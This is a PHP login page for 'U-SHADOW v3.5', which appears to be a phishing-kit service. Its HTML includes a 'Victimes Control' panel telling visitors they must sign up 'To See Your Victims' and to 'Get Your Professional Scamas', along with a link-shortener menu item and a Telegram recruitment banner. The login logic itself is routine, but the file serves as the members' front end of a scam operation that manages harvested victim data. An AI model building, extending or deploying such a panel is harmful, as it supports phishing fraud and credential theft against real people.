<?php
require_once __DIR__ . '/config.php';

if (isset($_SESSION['user'])) {
    header('Location: dashboard.php');
    exit;
}

$error = '';
$signup_success = isset($_GET['signup']) && $_GET['signup'] === 'success';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!verify_csrf_token($_POST['csrf_token'] ?? '')) {
        die('Invalid CSRF token');
    }

    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';

    $users = json_decode(file_get_contents(USERS_FILE), true);
    $authenticated = false;

    foreach ($users as $user) {
        if ($user['username'] === $username && password_verify($password, $user['password'])) {
            $_SESSION['user'] = $user;
            $authenticated = true;
            break;
        }
    }

    if ($authenticated) {
        header('Location: dashboard.php');
        exit;
    } else {
        $error = 'Invalid username or password';
    }
}

$csrf_token = generate_csrf_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-SHADOW | Login</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="old-index-body">

<div class="container-old">
    <header class="header-old-index">
        <div class="smikta-logo-corner">
            <div class="logo-diamond">U-SHADOW</div>
        </div>
        <div class="telegram-banner">
             <a href="https://t.me/your_telegram" target="_blank" class="btn-telegram">
                <i class="fab fa-telegram"></i> Join Our Telegram
             </a>
        </div>
    </header>

    <nav class="navbar-old">
        <ul>
            <li><a href="index.php"><i class="fas fa-home"></i> Home</a></li>
            <li><a href="signup.php"><i class="fas fa-user-plus"></i> Sign Up</a></li>
            <li><a href="#"><i class="fas fa-cut"></i> Short Your Link</a></li>
            <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
            <li><a href="#"><i class="fas fa-envelope"></i> Contact</a></li>
        </ul>
    </nav>

    <main class="split-layout-old">
        <section class="panel-old login-panel-old">
            <div class="panel-header-old">Login Panel</div>
            <div class="panel-body-old">
                <?php if ($error): ?>
                    <div class="status-badge error" style="display: block; margin-bottom: 15px;"><?php echo s($error); ?></div>
                <?php endif; ?>
                <?php if ($signup_success): ?>
                    <div class="status-badge success" style="display: block; margin-bottom: 15px;">Success! Please login.</div>
                <?php endif; ?>

                <form method="POST">
                    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                    <div class="form-group-old">
                        <input type="text" name="username" placeholder="Username" required>
                    </div>
                    <div class="form-group-old">
                        <input type="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="btn-old-submit">Sign In Now</button>
                    <div style="margin-top: 10px; font-size: 11px;">
                        <a href="#" style="color: #666; text-decoration: none;">Forgot Password?</a>
                    </div>
                </form>

                <div class="ads-placeholder">
                    <span style="color:red">A</span><span style="color:orange">D</span><span style="color:blue">S</span>
                </div>
            </div>
        </section>

        <section class="panel-old victims-panel-old">
            <div class="panel-header-old">.: Victimes Control :.</div>
            <div class="panel-body-old" style="text-align: center; color: #999; min-height: 200px; display: flex; flex-direction: column; justify-content: center;">
                <p>Hello You Must Be Member To See Your Victims</p>
                <p>Sign Up to Get Your Professional Scamas</p>
                <p><a href="signup.php" style="color: var(--primary);">Sign Up Here</a></p>
            </div>
        </section>
    </main>

    <footer class="footer-old">
        Copyright 2010-2025 | This Website Is Devlopped By K24KDX <br>
        <strong>U-SHADOW v3.5 &copy;</strong>
    </footer>
</div>

</body>
</html>
